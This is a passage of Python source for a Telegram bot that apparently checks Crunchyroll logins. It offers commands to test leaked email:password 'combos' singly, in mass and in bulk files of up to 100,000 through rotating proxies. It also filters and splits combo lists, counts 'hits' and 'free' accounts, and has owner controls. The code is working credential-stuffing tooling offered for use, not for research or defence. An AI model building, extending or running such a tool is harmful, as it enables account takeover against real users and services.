            content = (await file.download_as_bytearray()).decode('utf-8')
            proxies = [l.strip() for l in content.split('\n') if l.strip()]
        except Exception as e:
            await _reply(update,
                f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n<b>▸</b> {escape_html(str(e))}\n\n{DIV}"
            )
            return
    elif ctx.args:
        proxies = list(ctx.args)
    else:
        await _reply(update,
            f"{DIV}\n  <b>◎  USAGE</b>\n{DIV}\n\n"
            f"<b>▸</b> <code>/setadminproxy proxy1 proxy2...</code>\n"
            f"<b>▸</b> Or reply to a <code>.txt</code> file.\n\n{DIV}"
        )
        return
    parsed = []
    for p in proxies:
        pu = parse_proxy_input(p)
        if pu: parsed.append(pu)
    if not parsed:
        await _reply(update,
            f"{DIV}\n  <b>✗  INVALID</b>\n{DIV}\n\n<b>▸</b> No valid proxies found.\n\n{DIV}"
        )
        return
    set_admin_proxies(parsed)
    await _reply(update,
        f"{DIV}\n  <b>◆  ADMIN PROXY SET</b>\n{DIV}\n\n"
        f"<b>▸</b> {len(parsed)} admin proxies configured.\n\n"
        f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
    )

@require_channel
async def deladminproxy_cmd(update, ctx):
    if update.effective_user.id != OWNER_ID:
        await _reply(update,
            f"{DIV}\n  <b>◆  ACCESS DENIED</b>\n{DIV}\n\n<b>▸</b> Owner only.\n\n{DIV}"
        )
        return
    set_admin_proxies([])
    await _reply(update,
        f"{DIV}\n  <b>◆  ADMIN PROXY REMOVED</b>\n{DIV}\n\n"
        f"<b>▸</b> Admin proxies cleared.\n\n"
        f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
    )

# ── TOOLS ────────────────────────────────────────────────────
@require_channel
async def filter_cmd(update, ctx):
    if not update.message.reply_to_message:
        await _reply(update,
            f"{DIV}\n  <b>◎  USAGE</b>\n{DIV}\n\n"
            f"<b>▸</b> Reply to a text or <code>.txt</code> file with <code>/filter</code>\n\n{DIV}"
        )
        return
    target = update.message.reply_to_message
    if target.document:
        if not target.document.file_name.lower().endswith('.txt'):
            await _reply(update,
                f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n<b>▸</b> Only <code>.txt</code> files supported.\n\n{DIV}"
            )
            return
        try:
            content = await download_file_with_retries(ctx, target.document.file_id, timeout=600)
            combos = extract_combos(content)
        except Exception as e:
            await _reply(update,
                f"{DIV}\n  <b>✗  DOWNLOAD ERROR</b>\n{DIV}\n\n<b>▸</b> Could not download file.\n\n{DIV}"
            )
            return
    elif target.text:
        combos = extract_combos(target.text)
    else:
        await _reply(update,
            f"{DIV}\n  <b>◎  USAGE</b>\n{DIV}\n\n<b>▸</b> Reply to text or <code>.txt</code> file.\n\n{DIV}"
        )
        return
    if not combos:
        await _reply(update,
            f"{DIV}\n  <b>▧  FILTER</b>\n{DIV}\n\n<b>▸</b> No combos found.\n\n{DIV}"
        )
        return
    unique = list(dict.fromkeys(combos))
    fname = f"filtered_{len(unique)}_{int(time.time())}.txt"
    with open(fname, 'w', encoding='utf-8') as f:
        f.write('\n'.join(f"{e}:{p}" for e, p in unique))
    await safe_send_document(ctx.bot, update.effective_chat.id, open(fname, 'rb'),
                             filename=f"filtered_{len(unique)}.txt",
                             caption=f"Filtered: {len(unique)} unique combos  |  {COPYRIGHT}")

@require_channel
async def split_cmd(update, ctx):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await _reply(update,
            f"{DIV}\n"
            f"  <b>◎  SPLIT USAGE</b>\n"
            f"{DIV}\n\n"
            f"<b>▸</b> Reply to a <code>.txt</code> file with:\n"
            f"  <code>/split [chunk_size]</code>\n\n"
            f"<b>▸</b> Min chunk: 50,000 (combos) · 1,000 (text)\n"
            f"<b>▸</b> Max chunk: 100,000\n\n"
            f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
        )
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.txt'):
        await _reply(update,
            f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n<b>▸</b> Only <code>.txt</code> files are supported.\n\n{DIV}"
        )
        return
    args = ctx.args
    cs = 100000
    if args:
        try: cs = int(args[0])
        except:
            await _reply(update,
                f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n<b>▸</b> Invalid chunk size.\n\n{DIV}"
            )
            return
        if cs > 100000:
            await _reply(update,
                f"{DIV}\n  <b>▲  LIMIT</b>\n{DIV}\n\n<b>▸</b> Chunk size cannot exceed 100,000.\n\n{DIV}"
            )
            return

    try:
        content = await download_file_with_retries(ctx, doc.file_id, timeout=600)
    except Exception as e:
        await _reply(update,
            f"{DIV}\n  <b>✗  DOWNLOAD ERROR</b>\n{DIV}\n\n<b>▸</b> Could not download file.\n\n{DIV}"
        )
        return

    lines = [line for line in content.split('\n') if line.strip()]
    if not lines:
        await _reply(update,
            f"{DIV}\n  <b>✗  EMPTY</b>\n{DIV}\n\n<b>▸</b> File is empty.\n\n{DIV}"
        )
        return

    combo_lines = [line for line in lines if is_email_pass_line(line)]
    ratio = len(combo_lines) / len(lines) if lines else 0
    is_combo = ratio >= 0.5

    min_chunk = 50000 if is_combo else 1000
    if cs < min_chunk:
        cs = min_chunk

    total = len(lines)
    parts = (total + cs - 1) // cs
    if parts == 0:
        parts = 1

    await _reply(update,
        f"{DIV}\n  <b>◫  SPLITTING FILE</b>\n{DIV}\n\n"
        f"<b>▸ Total</b>   ➜  {total} lines\n"
        f"<b>▸ Parts</b>   ➜  {parts}\n"
        f"<b>▸ Size</b>    ➜  {cs} per chunk\n\n{DIV}"
    )
    for i in range(parts):
        chunk = lines[i*cs:(i+1)*cs]
        fname = f"part_{i+1}_of_{parts}.txt"
        with open(fname, 'w', encoding='utf-8') as f:
            f.write('\n'.join(chunk))
        try:
            await safe_send_document(ctx.bot, update.effective_chat.id, open(fname, 'rb'),
                                     filename=fname,
                                     caption=f"Part {i+1} / {parts}  ({len(chunk)} lines)  |  {COPYRIGHT}")
        except Exception:
            pass
        await asyncio.sleep(0.1)

# ── STATS ────────────────────────────────────────────────────
@require_channel
async def stats_cmd(update, ctx):
    uid = update.effective_user.id
    data = load_user_from_db(uid)
    if not data:
        await _reply(update,
            f"{DIV}\n  <b>▤  STATS</b>\n{DIV}\n\n<b>▸</b> No stats recorded yet.\n\n{DIV}"
        )
        return
    await _reply(update,
        f"{DIV}\n"
        f"  <b>▤  MY STATS</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Checked</b>  ➜  {data['total_checked']}\n"
        f"<b>▸ Hits</b>     ➜  {data['total_hits']}\n"
        f"<b>▸ Free</b>     ➜  {data['total_free']}\n"
        f"<b>▸ Fails</b>    ➜  {data['total_fail']}\n"
        f"<b>▸ PxyFail</b>  ➜  {data['total_proxy_fail']}\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )

# ── ADMIN BOT ON/OFF ─────────────────────────────────────────
@require_channel
async def adminbotoff_cmd(update, ctx):
    if update.effective_user.id != OWNER_ID:
        await _reply(update,
            f"{DIV}\n  <b>◆  ACCESS DENIED</b>\n{DIV}\n\n<b>▸</b> Owner only.\n\n{DIV}"
        )
        return
    global BOT_ENABLED
    BOT_ENABLED = False
    set_admin_config('bot_enabled', 'false')
    await _reply(update,
        f"{DIV}\n  <b>■  BOT OFFLINE</b>\n{DIV}\n\n"
        f"<b>▸</b> Bot has been turned <b>OFF</b>.\n"
        f"<b>▸</b> Users will see the maintenance message.\n\n"
        f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
    )

@require_channel
async def adminboton_cmd(update, ctx):
    if update.effective_user.id != OWNER_ID:
        await _reply(update,
            f"{DIV}\n  <b>◆  ACCESS DENIED</b>\n{DIV}\n\n<b>▸</b> Owner only.\n\n{DIV}"
        )
        return
    global BOT_ENABLED
    BOT_ENABLED = True
    set_admin_config('bot_enabled', 'true')
    await _reply(update,
        f"{DIV}\n  <b>▶  BOT ONLINE</b>\n{DIV}\n\n"
        f"<b>▸</b> Bot has been turned <b>ON</b>.\n\n"
        f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
    )

@require_channel
async def customadmin_cmd(update, ctx):
    if update.effective_user.id != OWNER_ID:
        await _reply(update,
            f"{DIV}\n  <b>◆  ACCESS DENIED</b>\n{DIV}\n\n<b>▸</b> Owner only.\n\n{DIV}"
        )
        return
    global CUSTOM_MESSAGE
    if not ctx.args and not update.message.reply_to_message:
        set_admin_config('custom_message', '')
        CUSTOM_MESSAGE = None
        await _reply(update,
            f"{DIV}\n  <b>◧  CUSTOM MESSAGE</b>\n{DIV}\n\n"
            f"<b>▸</b> Custom message cleared.\n\n{DIV}"
        )
        return

    msg = update.message.reply_to_message or update.message
    message_data = {}
    if msg.photo:
        message_data['type'] = 'photo'
        message_data['file_id'] = msg.photo[-1].file_id
        message_data['caption'] = msg.caption or ''
    elif msg.video:
        message_data['type'] = 'video'
        message_data['file_id'] = msg.video.file_id
        message_data['caption'] = msg.caption or ''
    elif msg.document:
        message_data['type'] = 'document'
        message_data['file_id'] = msg.document.file_id
        message_data['caption'] = msg.caption or ''
    elif msg.audio:
        message_data['type'] = 'audio'
        message_data['file_id'] = msg.audio.file_id
        message_data['caption'] = msg.caption or ''
    elif msg.voice:
        message_data['type'] = 'voice'
        message_data['file_id'] = msg.voice.file_id
    elif msg.sticker:
        message_data['type'] = 'sticker'
        message_data['file_id'] = msg.sticker.file_id
    elif msg.text:
        text = msg.text if msg.reply_to_message else ' '.join(ctx.args)
        message_data['type'] = 'text'
        message_data['text'] = text
    else:
        await _reply(update,
            f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n<b>▸</b> Unsupported message type.\n\n{DIV}"
        )
        return
    set_admin_config('custom_message', json.dumps(message_data))
    CUSTOM_MESSAGE = message_data
    await _reply(update,
        f"{DIV}\n  <b>◧  CUSTOM MESSAGE SET</b>\n{DIV}\n\n"
        f"<b>▸</b> Offline message saved successfully.\n\n"
        f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
    )

# ── MAIN ─────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).concurrent_updates(100).build()
    app.add_error_handler(error_handler)

    app.add_handler(CommandHandler("start",         start))
    app.add_handler(CommandHandler("check",         check_cmd))
    app.add_handler(CommandHandler("bulk",          bulk_cmd))
    app.add_handler(CommandHandler("mcheck",        mcheck_cmd))
    app.add_handler(CommandHandler("stop",          stop_cmd))
    app.add_handler(CommandHandler("setproxy",      setproxy_cmd))
    app.add_handler(CommandHandler("myproxy",       myproxy_cmd))
    app.add_handler(CommandHandler("delproxy",      delproxy_cmd))
    app.add_handler(CommandHandler("broadcast",     broadcast_cmd))
    app.add_handler(CommandHandler("setadminproxy", setadminproxy_cmd))
    app.add_handler(CommandHandler("deladminproxy", deladminproxy_cmd))
    app.add_handler(CommandHandler("filter",        filter_cmd))
    app.add_handler(CommandHandler("split",         split_cmd))
    app.add_handler(CommandHandler("stats",         stats_cmd))
    app.add_handler(CommandHandler("info",          lambda u, c: start(u, c)))
    app.add_handler(CommandHandler("adminbotoff",   adminbotoff_cmd))
    app.add_handler(CommandHandler("adminboton",    adminboton_cmd))
    app.add_handler(CommandHandler("customadmin",   customadmin_cmd))

    app.add_handler(CallbackQueryHandler(start,                       pattern="^back_to_main$"))
    app.add_handler(CallbackQueryHandler(my_profile_callback,         pattern="^my_profile$"))
    app.add_handler(CallbackQueryHandler(tools_menu_callback,         pattern="^tools_menu$"))
    app.add_handler(CallbackQueryHandler(checker_crunchyroll_callback,pattern="^checker_crunchyroll$"))
    app.add_handler(CallbackQueryHandler(proxy_menu_callback,         pattern="^proxy_menu$"))
    app.add_handler(CallbackQueryHandler(test_proxy_callback,         pattern="^test_proxy$"))
    app.add_handler(CallbackQueryHandler(myproxy_test_callback,       pattern="^test_myproxy_"))
    app.add_handler(CallbackQueryHandler(auto_bulk_callback,          pattern="^auto_bulk_"))
    app.add_handler(CallbackQueryHandler(owner_panel_callback,        pattern="^owner_panel$"))

    async def cr_info(update, ctx):
        q = update.callback_query
        await q.answer()
        msgs = {
            "cr_cmd_check": (
                f"{DIV}\n  <b>◎  SINGLE CHECK</b>\n{DIV}\n\n"
                f"<b>▸</b> <code>/check email:pass</code>\n"
                f"<b>▸</b> Or reply to a message with <code>/check</code>\n\n{DIV}"
            ),
            "cr_cmd_mass": (
                f"{DIV}\n  <b>▦  MASS CHECK</b>\n{DIV}\n\n"
                f"<b>▸</b> <code>/mcheck email:pass email2:pass2 ...</code>\n"
                f"<b>▸</b> Max {MAX_MASS_CHECK} combos at once\n\n{DIV}"
            ),
            "cr_cmd_bulk": (
                f"{DIV}\n  <b>▤  BULK CHECK</b>\n{DIV}\n\n"
                f"<b>▸</b> Reply to a <code>.txt</code> file with <code>/bulk</code>\n"
                f"<b>▸</b> Up to 100,000 combos per file\n\n{DIV}"
            ),
            "cr_cmd_stop": (
                f"{DIV}\n  <b>■  STOP</b>\n{DIV}\n\n"
                f"<b>▸</b> <code>/stop</code>  ➜  Cancel the running check\n\n{DIV}"
            ),
        }
        await q.edit_message_text(msgs.get(q.data, ""), parse_mode=ParseMode.HTML)

    app.add_handler(CallbackQueryHandler(cr_info, pattern="^cr_cmd_"))

    app.add_handler(MessageHandler(
        (filters.Document.FileExtension("txt") | filters.TEXT) & ~filters.COMMAND,
        auto_detect_combos
    ))

    logger.info(">>> Bot v1.5.0 (UI Redesign) starting ...")
    while True:
        try:
            app.run_polling(allowed_updates=Update.ALL_TYPES)
        except (httpx.HTTPError, ConnectionError, OSError) as e:
            logger.error(f"Polling error: {e}. Restart in 3s.")
            time.sleep(3)
        except Exception as e:
            logger.critical(f"Fatal: {e}")
            break

if __name__ == "__main__":
    main()
